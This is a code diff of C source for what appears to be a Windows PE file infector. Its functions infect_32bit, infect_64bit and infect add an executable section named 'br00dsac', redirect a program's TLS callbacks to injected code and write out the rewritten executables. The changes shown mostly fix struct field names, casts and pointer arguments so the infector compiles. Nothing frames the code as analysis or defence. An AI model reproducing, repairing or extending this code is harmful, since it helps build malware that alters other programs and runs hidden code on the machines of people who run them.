@@ -272,7 +272,7 @@ CVector infect_32bit(InfectorIAT *iat, CVector *module)
       puts("\t\tExecutable has relocations.");
 
    size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
-   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+module->e_lfanew+nt_headers_size);
+   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module, PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
 
    return cvector_alloc(iat, sizeof(uint8_t), 0);
 }
@@ -323,18 +323,18 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
       iat->memcpy(tls_data.data, byte_module+data_rva, tls_data.elements);
    }
 
-   if (old_tls_directory != NULL && old_tls_directory->AddressOfCallbacks != 0)
+   if (old_tls_directory != NULL && old_tls_directory->AddressOfCallBacks != 0)
    {
-      DWORD callback_rva = old_tls_directory->AddressOfCallbacks - nt_headers->OptionalHeader.ImageBase;
+      DWORD callback_rva = old_tls_directory->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
       uintptr_t *callback_array = RECAST(uintptr_t *,byte_module+callback_rva);
 
       do
       {
-         cvector_push(&iat, &tls_callbacks, callback_array++);
+         cvector_push(iat, &tls_callbacks, callback_array++);
 
          if (*callback_array == 0)
-            cvector_push(&iat, &tls_callbacks, callback_array);
-      } while (*callback_array != NULL);
+            cvector_push(iat, &tls_callbacks, callback_array);
+      } while (*callback_array != 0);
    }
 
    size_t aligned_tls_data_size = tls_data.elements;
@@ -366,7 +366,7 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    }
    
    new_section_size += CVECTOR_BYTES(&tls_callbacks) + 16; // add 16 bytes padding because it would be weird to have assembly directly after
-   new_tls_directory.AddressOfCallbacks = tls_callback_rva + nt_headers->OptionalHeader.ImageBase;
+   new_tls_directory.AddressOfCallBacks = tls_callback_rva + nt_headers->OptionalHeader.ImageBase;
    
    DWORD tls_infection_offset = new_section_size;
    DWORD tls_infection_rva = new_section->VirtualAddress + tls_infection_offset;
@@ -382,7 +382,7 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    new_section->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
    iat->memcpy(new_section->Name, "br00dsac", 8);
    
-   nt_headers->OptionalHeader.DataDirectories[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = new_section->VirtualAddress;
+   nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = new_section->VirtualAddress;
    nt_headers->OptionalHeader.SizeOfImage = 0;
 
    for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
@@ -414,8 +414,8 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
          target_rva += 8;
       }
 
-      DWORD callback_rva = new_tls_directory.AddressOfCallbacks - nt_headers->OptionalHeader.ImageBase;
-      uintptr_t *callback_ptr = RECAST(uintptr_t *, new_section_data+tls_callback_offset);
+      DWORD callback_rva = new_tls_directory.AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
+      uintptr_t *callback_ptr = RECAST(uintptr_t *, CVECTOR_CAST(uint8_t *, &new_section_data)+tls_callback_offset);
 
       while (*callback_ptr != 0)
       {
@@ -639,7 +639,7 @@ int infect(void)
 
          DWORD bytes_written = 0;
 
-         if (!iat.WriteFile(infected_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
+         if (!iat.writeFile(infected_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
          {
             printf("\tFailed to write %s.\n", CVECTOR_CAST(&new_filename, char *));
             goto infeced_file_close;
@@ -657,7 +657,7 @@ int infect(void)
       }
 
    free_file:
-      cvector_free(iat, &exe_buffer);
+      cvector_free(&iat, &exe_buffer);
 
    close_file:
       if (exe_handle != INVALID_HANDLE_VALUE)
